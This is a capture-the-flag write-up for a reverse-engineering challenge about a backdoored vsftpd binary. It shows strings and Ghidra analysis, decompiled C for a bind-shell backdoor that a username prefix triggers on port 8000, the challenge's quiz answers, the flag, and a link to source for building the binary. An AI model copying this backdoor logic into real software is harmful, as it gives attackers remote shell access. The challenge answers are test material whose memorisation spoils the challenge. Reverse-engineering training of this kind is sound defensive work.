---
description: 'Category: Reverse Engineering (Medium)'
---

# Flag Transfer Protocol

## Description

{% code overflow="wrap" %}
```
I found this weird program running on my homelab. Can you take a look at it and see if there's anything interesting about it?

Mirror 1: nc chall1.lagncra.sh 12474

Mirror 2: nc chall2.lagncra.sh 12474
```
{% endcode %}

(There will be no command output screenshots since I am using my personal laptop for this writeup)

## Walkthrough

We're provided with a single binary, and connection details to a netcat server. We can perform some basic analysis to figure out what type of binary this is, and what ASCII strings it may contain.

{% code overflow="wrap" %}
```bash
┌──(kali㉿kali)-[~/Artifacts]
└─$ file vsftpd        
vsftpd: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6a98650ae6896d81f24e7570702cf6b2d4bd549b, for GNU/Linux 3.2.0, stripped
```
{% endcode %}

Based on the output of `file`, it seems to be a regular binary, likely for the vsFTPd service. If we perform a strings analysis of the binary, we may find an interesting string in the output

{% code overflow="wrap" %}
```bash
──(kali㉿kali)-[~/Artifacts]
└─$ strings vsftpd
<REDACTED FOR BREVITY>
...
negative gid in vsf_sysutil_getgrgid
reopening standard file descriptors to /dev/null failed
Adodgy nmsg in pam_conv_func
/var/log/wtmp
vsf_auth_shutdown
prctl
capset
/bin/sh        <---- Why is this here?
vsftpd: 
mmap
sendmsg
recvmsg
no passed fd
vsf_insert_uwtmp
...
<REDACTED FOR BREVITY>
```
{% endcode %}

Hmm... last I checked FTP doesn't, and shouldn't have the capability to run system commands or spawn a shell, so this is an interesting find. We can open up the binary in Ghidra to get a closer look at the binary, and maybe figure out what's going on.

<figure><img src="../../.gitbook/assets/image (365).png" alt=""><figcaption><p>Dear god send help thats a lot of functions</p></figcaption></figure>

Fortunately, we don't have to sift through _every_ single one of the unnamed functions. We can instead jump straight to the function calling the /bin/sh string, and work from there. In Ghidra, select Search -> For Strings and leave everything else as default. In the search bar, enter "/bin/sh" and click Enter.

<figure><img src="../../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>

Ghidra provides us with the automatically-generated variable name of the string, and we can double-click on the search result to jump straight to the part in code that defines this string.&#x20;

<figure><img src="../../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>

The "XREF" text points to the function that calls this string, which we can also select to jump straight to the function.&#x20;

<figure><img src="../../.gitbook/assets/image (368).png" alt=""><figcaption></figcaption></figure>

Ghidra generates pseudo-C code based on the original assembly, to make reversing easier. We can clean up the pseudo-C code manually or using automated tools like AI to make it even more human-readable. For this example, we'll ask ChatGPT to clean up the script for us. Additional comments have been manually added for better clarity

{% code overflow="wrap" %}
```c
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
void FUN_001175e0(void)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        exit(1);
    }
    struct sockaddr addr = {0};            // Resolves to 0.0.0.0 - Listen on all addresses
    addr.sa_family = AF_INET;
    addr.sa_data[0] = 0x1f;                // sa_data forms the port number in big-endian
    addr.sa_data[1] = 0x40;
    if (bind(fd, &addr, sizeof(addr)) < 0) {
        exit(1);
    }
    if (listen(fd, 100) < 0) {
        exit(1);
    }
    while (1) {
        int client = accept(fd, NULL, NULL);
        if (client < 0) {
            continue;
        }
        close(0);
        close(1);
        close(2);
        dup2(client, 0);
        dup2(client, 1);
        dup2(client, 2);
        execl("/bin/sh", "sh", NULL);
    }
}
```
{% endcode %}

Based on the cleaned code, we can safely assume that this function is the backdoor planted in the binary. It creates a new socket object and attempts to bind it to port 8000 (which we can get by converting 0x1f40 to decimal). After binding, it will listen for incoming connections and spawn a bash shell when the attacker connects to it.

<figure><img src="../../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>

That's the backdoor function itself discovered, but how will the service know when the attacker triggers the backdoor? We can look through the function references for this function, and see what else calls it.&#x20;

<figure><img src="../../.gitbook/assets/image (294).png" alt=""><figcaption><p>It is generally good practice to rename functions to avoid confusing ourselves later on</p></figcaption></figure>

Looks like FUN\_0010DF40 will call this function, after performing some kind of check on `param_1` . Lets rename this function to `backdoor_trigger`, and look for the next function that calls it.

<figure><img src="../../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

Based on the strings in the pseudo-C, we can safely assume this function is related to user authentication, and so `backdoor_trigger` may be doing something with the username or password provided when a user tries to login. Going back to the trigger function, we can examine FUN\_0010D160 to see what it is doing.

<figure><img src="../../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

The function performs a set of character matches to check for a specific sequence of characters in the provided argument, likely the username. Based on our current investigations, we can safely assume the backdoor works as such

* The backdoored service listens for any connections
* When a connection is made, the service checks if the username begins with "NRTHLD"&#x20;
* If yes, the service creates a new socket process and listens on port 8000
* When a connection is made to port 8000, the service spawns a bash shell as the user it is running as, giving the user access to the server
* If no, the service continues with regular authentication logic

The backdoor hijacks the authentication logic right at the start, and then exits silently if the username doesn't match the expected trigger.&#x20;

That's all well and good, but we still have one more question that we haven't found the answer for

<figure><img src="../../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>

This can be easily solved with a simple Google search. Search for any vsFTPd version with a backdoor to get the answer.

<figure><img src="../../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

With that, we have all our answers. We can finish submitting the final answer and get our flag

```bash
┌──(kali㉿kali)-[~/Artifacts]
└─$ nc chall1.lagncra.sh 12474
┌────────────────────────────────────────────────┐
│        ____       _                            │
│       |  _ \ ___ | | __ _ _ __(_)___           │
│       | |_) / _ \| |/ _` | '__| / __|          │
│       |  __/ (_) | | (_| | |  | \__ \          │
│       |_|   \___/|_|\__,_|_|  |_|___/          │
│          Northland Forensics Server            │
│    “The truth is hidden in plain sight.”       │
└────────────────────────────────────────────────┘
Welcome, investigator. Your assignment awaits.
╔═════════════════════════════════════════════╗
║  Question 1 of 5  
╠═════════════════════════════════════════════╣
Reverse engineer the modified binary. What is the name of this service?

Hint: Answer in all lowercase (e.g. if the answer is FireFox, give the answer as 'firefox')
> vsftpd

Answer correct! Next question...
╔═════════════════════════════════════════════╗
║  Question 2 of 5  
╠═════════════════════════════════════════════╣
The program checks for a certain string to be present in the username. What is this string?

Hint: ******
> NRTHLD

Answer correct! Next question...
╔═════════════════════════════════════════════╗
║  Question 3 of 5  
╠═════════════════════════════════════════════╣
The program spawns a new network socket, and listens for connections on a specific TCP port. What is the listening port?

Hint: Provide a port number only (1-65535)
> 8000

Answer correct! Next question...
╔═════════════════════════════════════════════╗
║  Question 4 of 5  
╠═════════════════════════════════════════════╣
What is the name of the process that the backdoor attaches to the socket?

Hint: Provide the full path (e.g. '/usr/bin/cat' instead of 'cat')
> /bin/sh

Answer correct! Next question...
╔═════════════════════════════════════════════╗
║  Question 5 of 5  
╠═════════════════════════════════════════════╣
This binary appears to be derived from a known backdoored release of a service. Identify the original service version.

Hint: Search for past versions of this service that has been backdoored in the past
> 2.3.4

Answer correct! Next question...
All questions answered correctly. Assignment complete.
Here is your flag: LNC26{45926f24f31d43619ee08f0156af9622}
```

<figure><img src="../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

## Creator's Notes

Nothing much to say here. I wanted to experiment with some more realistic challenges, and decided to try a backdoored service as a reversing challenge. Some modifications had to be made, such as changing the username string match as well as the port number to avoid making the challenge too easy.&#x20;

If you're interested in trying out this exploit for yourself, you can obtain the source code to assemble the binary yourself [here](https://github.com/Ryo-Soikutsu/vsftpd-2.3.4).
